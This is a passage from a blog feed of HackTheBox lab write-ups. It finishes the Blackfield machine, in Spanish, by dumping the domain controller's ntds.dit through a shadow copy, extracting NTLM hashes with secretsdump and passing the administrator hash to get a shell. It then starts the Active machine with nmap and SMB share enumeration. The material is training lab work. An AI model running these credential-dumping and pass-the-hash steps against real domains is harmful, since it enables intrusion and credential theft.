SET CONTEXT <span class="o">{</span> CLIENTACCESSIBLE | PERSISTENT <span class="o">[</span> NOWRITERS <span class="o">]</span> | VOLATILE <span class="o">[</span> NOWRITERS <span class="o">]</span> <span class="o">}</span>

        CLIENTACCESSIBLE        Specify to create shadow copies usable by client versions of Windows.
        PERSISTENT              Specify that shadow copy is persist across program <span class="nb">exit</span>, reset or reboot.
        PERSISTENT NOWRITERS    Specify that shadow copy is persistent and all writers are excluded.
        VOLATILE                Specify that shadow copy will be deleted on <span class="nb">exit </span>or reset.
        VOLATILE NOWRITERS      Specify that shadow copy is volatile and all writers are excluded.

        Example: SET CONTEXT CLIENTACCESSIBLE
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\T</span>emp&gt;
</code></pre></div></div>

<ul>
  <li>
    <p>Al parecer nos esta quitando la s de <code class="language-plaintext highlighter-rouge">nowriters</code> así que para evitar eso vamos añadir un espacio en cada línea del archivo.</p>
  </li>
  <li>
    <p>Vamos a volver a subirlo a la maquina.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\T</span>emp&gt; erase zi.txt
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\T</span>emp&gt; upload zi.txt

Info: Uploading /home/miguel/Hackthebox/Blackfield/content/zi.txt to C:<span class="se">\T</span>emp<span class="se">\z</span>i.txt

Data: 128 bytes of 128 bytes copied

Info: Upload successful!
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\T</span>emp&gt;
</code></pre></div></div>

<ul>
  <li>Ahora si nos deja.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\T</span>emp&gt; diskshadow.exe /s c:<span class="se">\T</span>emp<span class="se">\z</span>i.txt
Microsoft DiskShadow version 1.0
Copyright <span class="o">(</span>C<span class="o">)</span> 2013 Microsoft Corporation
On computer:  DC01,  4/20/2024 7:06:00 PM

-&gt; <span class="nb">set </span>context persistent nowriters
-&gt; add volume c: <span class="nb">alias </span>miguelito
-&gt; create
Alias miguelito <span class="k">for </span>shadow ID <span class="o">{</span>07a7acf0-58c9-4f66-b559-38688a2be1c2<span class="o">}</span> <span class="nb">set </span>as environment variable.
Alias VSS_SHADOW_SET <span class="k">for </span>shadow <span class="nb">set </span>ID <span class="o">{</span>c201721e-e14d-44dd-8a40-1fb46d14908c<span class="o">}</span> <span class="nb">set </span>as environment variable.

Querying all shadow copies with the shadow copy <span class="nb">set </span>ID <span class="o">{</span>c201721e-e14d-44dd-8a40-1fb46d14908c<span class="o">}</span>

	<span class="k">*</span> Shadow copy ID <span class="o">=</span> <span class="o">{</span>07a7acf0-58c9-4f66-b559-38688a2be1c2<span class="o">}</span>	%miguelito%
		- Shadow copy <span class="nb">set</span>: <span class="o">{</span>c201721e-e14d-44dd-8a40-1fb46d14908c<span class="o">}</span>	%VSS_SHADOW_SET%
		- Original count of shadow copies <span class="o">=</span> 1
		- Original volume name: <span class="se">\\</span>?<span class="se">\V</span>olume<span class="o">{</span>6cd5140b-0000-0000-0000-602200000000<span class="o">}</span><span class="se">\ </span><span class="o">[</span>C:<span class="se">\]</span>
		- Creation <span class="nb">time</span>: 4/20/2024 7:06:01 PM
		- Shadow copy device name: <span class="se">\\</span>?<span class="se">\G</span>LOBALROOT<span class="se">\D</span>evice<span class="se">\H</span>arddiskVolumeShadowCopy1
		- Originating machine: DC01.BLACKFIELD.local
		- Service machine: DC01.BLACKFIELD.local
		- Not exposed
		- Provider ID: <span class="o">{</span>b5946137-7b9f-4925-af80-51abd60b20d5<span class="o">}</span>
		- Attributes:  No_Auto_Release Persistent No_Writers Differential

Number of shadow copies listed: 1
-&gt; expose %miguelito% z:
-&gt; %miguelito% <span class="o">=</span> <span class="o">{</span>07a7acf0-58c9-4f66-b559-38688a2be1c2<span class="o">}</span>
The shadow copy was successfully exposed as z:<span class="se">\.</span>
-&gt;
</code></pre></div></div>

<ul>
  <li>Ahora vamos a la unidad donde nos la creo.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\T</span>emp&gt; <span class="nb">dir </span>z:<span class="se">\</span>


    Directory: z:<span class="se">\</span>


Mode                LastWriteTime         Length Name
<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
d-----        5/26/2020   5:38 PM                PerfLogs
d-----         6/3/2020   9:47 AM                profiles
d-r---        3/19/2020  11:08 AM                Program Files
d-----         2/1/2020  11:05 AM                Program Files <span class="o">(</span>x86<span class="o">)</span>
d-----        4/20/2024   7:04 PM                Temp
d-r---        2/23/2020   9:16 AM                Users
d-----        9/21/2020   4:29 PM                Windows
<span class="nt">-a----</span>        2/28/2020   4:36 PM            447 notes.txt
</code></pre></div></div>

<ul>
  <li>Y gracias a esto ya podemos crear la copia del <code class="language-plaintext highlighter-rouge">ntds</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\T</span>emp&gt; <span class="nb">dir </span>z:<span class="se">\W</span>indows<span class="se">\N</span>TDS


    Directory: z:<span class="se">\W</span>indows<span class="se">\N</span>TDS


Mode                LastWriteTime         Length Name
<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
<span class="nt">-a----</span>        4/10/2023   6:29 PM           8192 edb.chk
<span class="nt">-a----</span>        4/20/2024   6:58 PM       10485760 edb.log
<span class="nt">-a----</span>        2/23/2020   9:41 AM       10485760 edb00004.log
<span class="nt">-a----</span>        2/23/2020   9:41 AM       10485760 edb00005.log
<span class="nt">-a----</span>        2/23/2020   3:13 AM       10485760 edbres00001.jrs
<span class="nt">-a----</span>        2/23/2020   3:13 AM       10485760 edbres00002.jrs
<span class="nt">-a----</span>        2/23/2020   9:41 AM       10485760 edbtmp.log
<span class="nt">-a----</span>        4/20/2024   5:43 PM       18874368 ntds.dit
<span class="nt">-a----</span>        4/20/2024   5:58 PM          16384 ntds.jfm
<span class="nt">-a----</span>        4/20/2024   5:43 PM         434176 temp.edb
</code></pre></div></div>

<ul>
  <li>
    <p>Básicamente lo que hicimos fue un <code class="language-plaintext highlighter-rouge">shadow cop</code>y de lo que hay en <code class="language-plaintext highlighter-rouge">C:\</code> pero en <code class="language-plaintext highlighter-rouge">Z</code>.</p>
  </li>
  <li>
    <p>Pero con <code class="language-plaintext highlighter-rouge">copy</code> no se puede.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\T</span>emp&gt; copy z:<span class="se">\W</span>indows<span class="se">\N</span>TDS<span class="se">\n</span>tds.dit ntds.dit
Access to the path <span class="s1">'z:\Windows\NTDS\ntds.dit'</span> is denied.
At line:1 char:1
+ copy z:<span class="se">\W</span>indows<span class="se">\N</span>TDS<span class="se">\n</span>tds.dit ntds.dit
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: <span class="o">(</span>z:<span class="se">\W</span>indows<span class="se">\N</span>TDS<span class="se">\n</span>tds.dit:FileInfo<span class="o">)</span> <span class="o">[</span>Copy-Item], UnauthorizedAccessException
    + FullyQualifiedErrorId : CopyFileInfoItemUnauthorizedAccessError,Microsoft.PowerShell.Commands.CopyItemCommand
</code></pre></div></div>

<ul>
  <li>Vamos a probar <code class="language-plaintext highlighter-rouge">robocopy</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\T</span>emp&gt; robocopy /b z:<span class="se">\W</span>indows<span class="se">\N</span>TDS<span class="se">\ </span><span class="nb">.</span> ntds.dit

<span class="nt">-------------------------------------------------------------------------------</span>
   ROBOCOPY     ::     Robust File Copy <span class="k">for </span>Windows
<span class="nt">-------------------------------------------------------------------------------</span>

  Started : Saturday, April 20, 2024 7:12:11 PM
   Source : z:<span class="se">\W</span>indows<span class="se">\N</span>TDS<span class="se">\</span>
     Dest : C:<span class="se">\T</span>emp<span class="se">\</span>

    Files : ntds.dit

  Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30

<span class="nt">------------------------------------------------------------------------------</span>

	                   1	z:<span class="se">\W</span>indows<span class="se">\N</span>TDS<span class="se">\</span>
	    New File  		  18.0 m	ntds.dit
  0.0%
  0.3%
  0.6%
  1.0%
  1.3%
  1.7%
  2.0%
  2.4%
  2.7%
  3.1%
  3.4%
  3.8%
  4.1%
  4.5%
  4.8%
  5.2%
  5.5%
  5.9%
  6.2%
  6.5%
  6.9%
  7.2%
  7.6%
  7.9%
  8.3%
  8.6%
  9.0%
  9.3%
  9.7%
 10.0%
 10.4%
 10.7%
 11.1%
 11.4%
 11.8%
 12.1%
 12.5%
 12.8%
 13.1%
 13.5%
 13.8%
 14.2%
 14.5%
 14.9%
 15.2%
 15.6%
 15.9%
 16.3%
 16.6%
 17.0%
 17.3%
 17.7%
 18.0%
 18.4%
 18.7%
 19.0%
 19.4%
 19.7%
 20.1%
 20.4%
 20.8%
 21.1%
 21.5%
 21.8%
 22.2%
 22.5%
 22.9%
 23.2%
 23.6%
 23.9%
 24.3%
 24.6%
 25.0%
 25.3%
 25.6%
 26.0%
 26.3%
 26.7%
 27.0%
 27.4%
 27.7%
 28.1%
 28.4%
 28.8%
 29.1%
 29.5%
 29.8%
 30.2%
 30.5%
 30.9%
 31.2%
 31.5%
 31.9%
 32.2%
 32.6%
 32.9%
 33.3%
 33.6%
 34.0%
 34.3%
 34.7%
 35.0%
 35.4%
 35.7%
 36.1%
 36.4%
 36.8%
 37.1%
 37.5%
 37.8%
 38.1%
 38.5%
 38.8%
 39.2%
 39.5%
 39.9%
 40.2%
 40.6%
 40.9%
 41.3%
 41.6%
 42.0%
 42.3%
 42.7%
 43.0%
 43.4%
 43.7%
 44.0%
 44.4%
 44.7%
 45.1%
 45.4%
 45.8%
 46.1%
 46.5%
 46.8%
 47.2%
 47.5%
 47.9%
 48.2%
 48.6%
 48.9%
 49.3%
 49.6%
 50.0%
 50.3%
 50.6%
 51.0%
 51.3%
 51.7%
 52.0%
 52.4%
 52.7%
 53.1%
 53.4%
 53.8%
 54.1%
 54.5%
 54.8%
 55.2%
 55.5%
 55.9%
 56.2%
 56.5%
 56.9%
 57.2%
 57.6%
 57.9%
 58.3%
 58.6%
 59.0%
 59.3%
 59.7%
 60.0%
 60.4%
 60.7%
 61.1%
 61.4%
 61.8%
 62.1%
 62.5%
 62.8%
 63.1%
 63.5%
 63.8%
 64.2%
 64.5%
 64.9%
 65.2%
 65.6%
 65.9%
 66.3%
 66.6%
 67.0%
 67.3%
 67.7%
 68.0%
 68.4%
 68.7%
 69.0%
 69.4%
 69.7%
 70.1%
 70.4%
 70.8%
 71.1%
 71.5%
 71.8%
 72.2%
 72.5%
 72.9%
 73.2%
 73.6%
 73.9%
 74.3%
 74.6%
 75.0%
 75.3%
 75.6%
 76.0%
 76.3%
 76.7%
 77.0%
 77.4%
 77.7%
 78.1%
 78.4%
 78.8%
 79.1%
 79.5%
 79.8%
 80.2%
 80.5%
 80.9%
 81.2%
 81.5%
 81.9%
 82.2%
 82.6%
 82.9%
 83.3%
 83.6%
 84.0%
 84.3%
 84.7%
 85.0%
 85.4%
 85.7%
 86.1%
 86.4%
 86.8%
 87.1%
 87.5%
 87.8%
 88.1%
 88.5%
 88.8%
 89.2%
 89.5%
 89.9%
 90.2%
 90.6%
 90.9%
 91.3%
 91.6%
 92.0%
 92.3%
 92.7%
 93.0%
 93.4%
 93.7%
 94.0%
 94.4%
 94.7%
 95.1%
 95.4%
 95.8%
 96.1%
 96.5%
 96.8%
 97.2%
 97.5%
 97.9%
 98.2%
 98.6%
 98.9%
 99.3%
 99.6%
100%
100%

<span class="nt">------------------------------------------------------------------------------</span>

               Total    Copied   Skipped  Mismatch    FAILED    Extras
    Dirs :         1         0         1         0         0         0
   Files :         1         1         0         0         0         0
   Bytes :   18.00 m   18.00 m         0         0         0         0
   Times :   0:00:00   0:00:00                       0:00:00   0:00:00


   Speed :           171585163 Bytes/sec.
   Speed :            9818.181 MegaBytes/min.
   Ended : Saturday, April 20, 2024 7:12:11 PM

<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\T</span>emp&gt; <span class="nb">dir


    </span>Directory: C:<span class="se">\T</span>emp


Mode                LastWriteTime         Length Name
<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
<span class="nt">-a----</span>        4/20/2024   7:06 PM            615 2024-04-20_19-06-01_DC01.cab
<span class="nt">-a----</span>        4/20/2024   5:43 PM       18874368 ntds.dit
<span class="nt">-a----</span>        4/20/2024   6:42 PM       17375232 system
<span class="nt">-a----</span>        4/20/2024   7:04 PM             96 zi.txt


<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\T</span>emp&gt;
</code></pre></div></div>

<ul>
  <li>Ahora ya lo podemos descargar.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\T</span>emp&gt; download C:<span class="se">\T</span>emp<span class="se">\n</span>tds.dit
</code></pre></div></div>

<ul>
  <li>Una vez nos descargamos el <code class="language-plaintext highlighter-rouge">ntds.dit</code> y el system ya podemos usar <code class="language-plaintext highlighter-rouge">impacket-secretsdump</code> para ver los hashes del usuarios del dominio.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-secretsdump <span class="nt">-system</span> system <span class="nt">-ntds</span> ntds.dit LOCAL
Impacket v0.11.0 - Copyright 2023 Fortra

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Dumping Domain Credentials <span class="o">(</span>domain<span class="se">\u</span><span class="nb">id</span>:rid:lmhash:nthash<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Searching <span class="k">for </span>pekList, be patient
<span class="o">[</span><span class="k">*</span><span class="o">]</span> PEK <span class="c"># 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Reading and decrypting hashes from ntds.dit
Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC01<span class="nv">$:</span>1000:aad3b435b51404eeaad3b435b51404ee:7f82cc4be7ee6ca0b417c0719479dbec:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::
audit2020:1103:aad3b435b51404eeaad3b435b51404ee:600a406c2c1f2062eb9bb227bad654aa:::
support:1104:aad3b435b51404eeaad3b435b51404ee:cead107bf11ebc28b3e6e90cde6de212:::
</code></pre></div></div>

<h2 id="roottxt">root.txt</h2>

<ul>
  <li>Ahora ya podemos validar el hash y conectarnos para leer la ultima flag.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb 10.129.23.192 <span class="nt">-u</span> <span class="s1">'Administrator'</span> <span class="nt">-H</span> <span class="s1">'184fb5e5178480be64824d4cd53b99ee'</span>
SMB         10.129.23.192   445    DC01             <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:DC01<span class="o">)</span> <span class="o">(</span>domain:BLACKFIELD.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.129.23.192   445    DC01             <span class="o">[</span>+] BLACKFIELD.local<span class="se">\A</span>dministrator:184fb5e5178480be64824d4cd53b99ee <span class="o">(</span>Pwn3d!<span class="o">)</span>
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content evil-winrm <span class="nt">-i</span> 10.129.23.192 <span class="nt">-u</span> <span class="s1">'Administrator'</span> <span class="nt">-H</span> <span class="s1">'184fb5e5178480be64824d4cd53b99ee'</span>

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
</span>blackfield<span class="se">\a</span>dministrator
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt; <span class="nb">type </span>root.txt
4375a629c7c67c8e29db269060c955cb
</code></pre></div></div>

<ul>
  <li>Vemos que dejaron una nota.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt; <span class="nb">type </span>notes.txt
Mates,

After the domain compromise and computer forensic last week, auditors advised us to:
- change every passwords <span class="nt">--</span> Done.
- change krbtgt password twice <span class="nt">--</span> Done.
- disable auditor<span class="s1">'s account (audit2020) -- KO.
- use nominative domain admin accounts instead of this one -- KO.

We will probably have to backup &amp; restore things later.
- Mike.

PS: Because the audit report is sensitive, I have encrypted it on the desktop (root.txt)
</span></code></pre></div></div>]]></content><author><name>MiguelRega7</name></author><category term="hackthebox/machines/hard" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HackTheBox - Active (easy)</title><link href="http://localhost:4000/hackthebox/machines/easy/2024/04/15/active.html" rel="alternate" type="text/html" title="HackTheBox - Active (easy)" /><published>2024-04-15T00:00:00-06:00</published><updated>2024-04-15T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/machines/easy/2024/04/15/active</id><content type="html" xml:base="http://localhost:4000/hackthebox/machines/easy/2024/04/15/active.html"><![CDATA[<p align="center">
<img src="https://labs.hackthebox.com/storage/avatars/5837ac5e28291146a9f2a8a015540c28.png" />
</p>

<ul>
  <li>Active is a quick and fun medium box where we have to do SMB enumeration to obtain credentials of a valid user in the dc and Kerberoasting to receive a ticket to crack this ticket is for the administrator user.</li>
</ul>

<h2 id="portscan">PortScan</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-sCV</span> <span class="nt">-p53</span>,88,135,139,445,593,3269,47001,49153,49168 10.10.10.100 <span class="nt">-oN</span> targeted
Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-01-28 17:22 CST
Nmap scan report <span class="k">for </span>10.10.10.100
Host is up <span class="o">(</span>0.66s latency<span class="o">)</span><span class="nb">.</span>

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 <span class="o">(</span>1DB15D39<span class="o">)</span> <span class="o">(</span>Windows Server 2008 R2 SP1<span class="o">)</span>
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 <span class="o">(</span>1DB15D39<span class="o">)</span>
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server <span class="nb">time</span>: 2023-01-28 23:22:21Z<span class="o">)</span>
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3269/tcp  open  tcpwrapped
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49153/tcp open  msrpc         Microsoft Windows RPC
49168/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled and required
| smb2-time: 
|   <span class="nb">date</span>: 2023-01-28T23:23:22
|_  start_date: 2023-01-28T23:13:30
|_clock-skew: <span class="nt">-1s</span>
</code></pre></div></div>

<h2 id="enumeration">Enumeration</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ crackmapexec smb 10.10.10.100
SMB         10.10.10.100    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 6.1 Build 7601 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:active.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>We see a domain add to the <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ping <span class="nt">-c</span> 1 active.htb
PING active.htb <span class="o">(</span>10.10.10.100<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
64 bytes from active.htb <span class="o">(</span>10.10.10.100<span class="o">)</span>: <span class="nv">icmp_seq</span><span class="o">=</span>1 <span class="nv">ttl</span><span class="o">=</span>127 <span class="nb">time</span><span class="o">=</span>902 ms

<span class="nt">---</span> active.htb ping statistics <span class="nt">---</span>
1 packets transmitted, 1 received, 0% packet loss, <span class="nb">time </span>0ms
rtt min/avg/max/mdev <span class="o">=</span> 901.525/901.525/901.525/0.000 ms
❯ <span class="nb">cat</span> /etc/hosts | <span class="nb">tail</span> <span class="nt">-n</span> 1
10.10.10.100 active.htb
</code></pre></div></div>

<ul>
  <li>There are shared resources.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbclient <span class="nt">-L</span> 10.10.10.100 <span class="nt">-N</span>
Anonymous login successful

	Sharename       Type      Comment
	<span class="nt">---------</span>       <span class="nt">----</span>      <span class="nt">-------</span>
	ADMIN<span class="nv">$ </span>         Disk      Remote Admin
	C<span class="nv">$ </span>             Disk      Default share
	IPC<span class="nv">$ </span>           IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	Replication     Disk      
	SYSVOL          Disk      Logon server share 
	Users           Disk      
SMB1 disabled <span class="nt">--</span> no workgroup available
</code></pre></div></div>

<ul>
  <li>We can read <code class="language-plaintext highlighter-rouge">Replication</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbmap <span class="nt">-H</span> 10.10.10.100
<span class="o">[</span>+] IP: 10.10.10.100:445	Name: active.htb                                        
	Disk                                                  	Permissions	Comment
	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
	ADMIN<span class="nv">$ </span>                                           	NO ACCESS	Remote Admin
	C<span class="nv">$ </span>                                               	NO ACCESS	Default share
	IPC<span class="nv">$ </span>                                             	NO ACCESS	Remote IPC
	NETLOGON                                          	NO ACCESS	Logon server share 
	Replication                                       	READ ONLY	
	SYSVOL                                            	NO ACCESS	Logon server share 
	Users                                             	NO ACCESS	

</code></pre></div></div>

<ul>
  <li>We found this.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbmap <span class="nt">-H</span> 10.10.10.100 <span class="nt">-r</span> Replication
<span class="o">[</span>+] IP: 10.10.10.100:445	Name: active.htb                                        
	Disk                                                  	Permissions	Comment
	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
	Replication                                       	READ ONLY	
	.<span class="se">\R</span>eplication<span class="se">\*</span>
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	<span class="nb">.</span>
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	..
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	active.htb
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbmap <span class="nt">-H</span> 10.10.10.100 <span class="nt">-r</span> Replication/active.htb/
<span class="o">[</span>+] IP: 10.10.10.100:445	Name: active.htb                                        
	Disk                                                  	Permissions	Comment
	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
	Replication                                       	READ ONLY	
	.<span class="se">\R</span>eplicationactive.htb<span class="se">\*</span>
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	<span class="nb">.</span>
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	..
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	DfsrPrivate
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	Policies
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	scripts
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbmap <span class="nt">-H</span> 10.10.10.100 <span class="nt">-r</span> Replication/active.htb/Policies/
<span class="o">[</span>+] IP: 10.10.10.100:445	Name: active.htb                                        
	Disk                                                  	Permissions	Comment
	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
	Replication                                       	READ ONLY	
	.<span class="se">\R</span>eplicationactive.htb<span class="se">\P</span>olicies<span class="se">\*</span>
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	<span class="nb">.</span>
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	..
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	<span class="o">{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span class="o">}</span>
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	<span class="o">{</span>6AC1786C-016F-11D2-945F-00C04fB984F9<span class="o">}</span>

</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbmap <span class="nt">-H</span> 10.10.10.100 <span class="nt">-r</span> Replication/active.htb/Policies/<span class="o">{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span class="o">}</span>/
<span class="o">[</span>+] IP: 10.10.10.100:445	Name: active.htb                                        
	Disk                                                  	Permissions	Comment
	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
	Replication                                       	READ ONLY	
	.<span class="se">\R</span>eplicationactive.htb<span class="se">\P</span>olicies<span class="se">\{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span class="o">}</span><span class="se">\*</span>
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	<span class="nb">.</span>
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	..
	fr--r--r--               23 Sat Jul 21 05:38:11 2018	GPT.INI
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	Group Policy
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	MACHINE
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	USER
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbmap <span class="nt">-H</span> 10.10.10.100 <span class="nt">-r</span> Replication/active.htb/Policies/<span class="o">{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span class="o">}</span>/MACHINE/
<span class="o">[</span>+] IP: 10.10.10.100:445	Name: active.htb                                        
	Disk                                                  	Permissions	Comment
	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
	Replication                                       	READ ONLY	
	.<span class="se">\R</span>eplicationactive.htb<span class="se">\P</span>olicies<span class="se">\{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span class="o">}</span><span class="se">\M</span>ACHINE<span class="se">\*</span>
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	<span class="nb">.</span>
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	..
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	Microsoft
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	Preferences
	fr--r--r--             2788 Sat Jul 21 05:38:11 2018	Registry.pol
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbmap <span class="nt">-H</span> 10.10.10.100 <span class="nt">-r</span> Replication/active.htb/Policies/<span class="o">{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span class="o">}</span>/MACHINE/Preferences/
<span class="o">[</span>+] IP: 10.10.10.100:445	Name: active.htb                                        
	Disk                                                  	Permissions	Comment
	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
	Replication                                       	READ ONLY	
	.<span class="se">\R</span>eplicationactive.htb<span class="se">\P</span>olicies<span class="se">\{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span class="o">}</span><span class="se">\M</span>ACHINE<span class="se">\P</span>references<span class="se">\*</span>
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	<span class="nb">.</span>
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	..
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	Groups
</code></pre></div></div>

